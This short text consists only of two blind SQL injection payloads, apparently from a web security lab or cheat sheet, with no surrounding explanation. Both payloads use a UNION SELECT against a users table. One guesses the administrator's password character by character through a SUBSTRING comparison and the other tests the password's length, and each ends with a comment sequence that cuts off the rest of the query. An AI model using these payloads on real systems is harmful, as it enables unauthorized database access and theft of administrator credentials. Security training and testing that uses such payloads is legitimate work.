' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'-- 

x' UNION SELECT 'a' FROM users WHERE username='administrator' and length(password)>1--
